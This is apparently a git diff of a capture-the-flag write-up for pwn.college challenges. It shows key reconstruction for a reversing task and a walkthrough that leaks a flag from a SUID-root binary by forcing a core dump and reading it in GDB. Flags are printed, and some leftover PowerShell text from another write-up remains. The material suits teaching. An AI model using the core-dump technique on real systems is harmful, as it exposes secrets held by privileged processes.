@@ -25,7 +25,6 @@ Solutions and all challenge files to follow along are also on [GitHub](https://g
 
 ## Day 1 - Warm-up gatekeeper
 
-### Description
 In this challenge we're dealing with an ELF 😛 file that performs some checks on its input:
 
 ```bash
@@ -93,12 +92,12 @@ And thousands of basic operations (`sub` and `add`) applied on each element. Tow
 
 For this level, once you understand what's happening a simple Python script can parse all the code, extract the operations and final value for each array element and reverse them to get the expected input key:
 ```python
- ➤ python3 day-01-reconstruct-key.py
+~ python3 day-01-reconstruct-key.py
 --- Key Reconstruction Complete ---
 Key length: 1024 bytes
 
 Successfully wrote the reconstructed key to 'reconstructed_key.bin' (binary format).
-➤ ✔ scp reconstructed_key.bin hacker@dojo.pwn.college:/home/hacker
+~ scp reconstructed_key.bin hacker@dojo.pwn.college:/home/hacker
 reconstructed_key.bin
 ```
 
@@ -111,12 +110,169 @@ pwn.college{cqFsdOJjQoO-immwxNL7kN4DOFJ.QX4UDOxIDLzQDMyQzW}
 
 ## Day 2 - Dumpable SUID binary
 
+Another ELF binary:
+```bash
+$ pwn checksec /challenge/claus
+[*] '/challenge/claus'
+    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        PIE enabled
+    Stripped:   No
+```
 
-### Description
+But this time we have its source:
+```c
+#define _GNU_SOURCE
+#include <errno.h>
+#include <fcntl.h>
+#include <signal.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+char gift[256];
+
+void wrap(char *gift, size_t size)
+{
+    fprintf(stdout, "Wrapping gift: [          ] 0%%");
+    for (int i = 0; i < size; i++) {
+        sleep(1);
+        gift[i] = "#####\n"[i % 6];
+        int progress = (i + 1) * 100 / size;
+        int bars = progress / 10;
+        fprintf(stdout, "\rWrapping gift: [");
+        for (int j = 0; j < 10; j++) {
+            fputc(j < bars ? '=' : ' ', stdout);
+        }
+        fprintf(stdout, "] %d%%", progress);
+        fflush(stdout);
+    }
+    fprintf(stdout, "\n🎁 Gift wrapped successfully!\n\n");
+}
+
+void sigtstp_handler(int signum)
+{
+    puts("🎅 Santa won't stop!");
+}
+
+int main(int argc, char **argv, char **envp)
+{
+    uid_t ruid, euid, suid;
+
+    if (getresuid(&ruid, &euid, &suid) == -1) {
+        perror("getresuid");
+        return 1;
+    }
+
+    if (euid != 0) {
+        fprintf(stderr, "❌ Error: Santa must wrap as root!\n");
+        return 1;
+    }
+
+    if (ruid != 0) {
+        if (setreuid(0, -1) == -1) {
+            perror("setreuid");
+            return 1;
+        }
+
+        fprintf(stdout, "🦌 Now, Dasher! now, Dancer! now, Prancer and Vixen!\nOn, Comet! on Cupid! on, Donder and Blitzen!\n\n");
+        execve("/proc/self/exe", argv, envp);
+
+        perror("execve");
+        return 127;
+    }
+
+    if (signal(SIGTSTP, sigtstp_handler) == SIG_ERR) {
+        perror("signal");
+        return 1;
+    }
+
+    int fd = open("/flag", O_RDONLY);
+    if (fd == -1) {
+        perror("open");
+        return 1;
+    }
+
+    int count = read(fd, gift, sizeof(gift));
+    if (count == -1) {
+        perror("read");
+        return 1;
+    }
+
+    wrap(gift, count);
+
+    puts("🎄 Merry Christmas!\n");
+    puts(gift);
+
+    return 0;
+}
+```
+
+Day 2 has a short init script that modifies the pattern for core files, to be in line with the challenge descrption:
+```bash
+#!/bin/sh
+
+set -eu
+
+mount -o remount,rw /proc/sys
+echo coal > /proc/sys/kernel/core_pattern
+mount -o remount,ro /proc/sys
+```
+
+The plan for this one is straight-forward: trigger a core dump then find the flag, which should still have been in memory. To do that, first make sure to set the core size:
+```bash
+$ ulimit -c
+0
+$ ulimit -c unlimited
+$ ulimit -c
+unlimited
+```
+
+There might be other ways but I went for a SIGQUIT (**Ctrl + \**))which triggers a core dump:
+```bash
+$ /challenge/claus
+🦌 Now, Dasher! now, Dancer! now, Prancer and Vixen!
+On, Comet! on Cupid! on, Donder and Blitzen!
+
+Wrapping gift: [          ] 1%^\Quit (core dumped)
+
+$ ls -al coal
+-rw------- 1 root ubuntu 425984 Dec  2 19:41 coal
+```
+
+There are multiple ways to extract the flag as well, but I wanted to see if I coudl find it in the core using GDB:
+```bash
+gdb /challenge/claus ~/coal
+
+gef➤  bt
+#0  0x00007f51c4d86a7a in clock_nanosleep () from /lib/x86_64-linux-gnu/libc.so.6
+#1  0x00007f51c4d93a27 in nanosleep () from /lib/x86_64-linux-gnu/libc.so.6
+#2  0x00007f51c4da8c93 in sleep () from /lib/x86_64-linux-gnu/libc.so.6
+#3  0x0000557a2330723d in wrap ()
+#4  0x0000557a2330755b in main ()
+
+gef➤  x/7i $rip
+=> 0x557a2330755b <main+452>:   lea    rax,[rip+0xbf9]        # 0x557a2330815b
+   0x557a23307562 <main+459>:   mov    rdi,rax
+   0x557a23307565 <main+462>:   call   0x557a23307030 <puts@plt>
+   0x557a2330756a <main+467>:   lea    rax,[rip+0x2b4f]        # 0x557a2330a0c0 <gift>
+   0x557a23307571 <main+474>:   mov    rdi,rax
+   0x557a23307574 <main+477>:   call   0x557a23307030 <puts@plt>
+   0x557a23307579 <main+482>:   mov    eax,0x0
+
+gef➤  x/s 0x557a2330a0c0
+0x557a2330a0c0 <gift>:  "##n.college{4vYY1y_EKEbWDpks1zEp7C7y8mm.QX4cDOxIDLzQDMyQzW}\n"
+```
+
+## Day 3 - Sleeping nicely
 
 <blockquote>
-  <p>The password for trebek2 is the name of the script referenced in a deleted task as depicted in the event logs on the desktop PLUS the name of the text file on the user's desktop.</p>
+  <p>Only when children sleep sweetly and nice does Santa begin his flight</p>
 </blockquote>
+
+Despite having a massive description, this is another short and sweet one. 
 
 <div class="box-note">
 Note that <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/out-string?view=powershell-6" target="_blank">Out-String -Stream</a> is very important here. This is needed to be able to use <b>Select-String</b> and grep through the output!
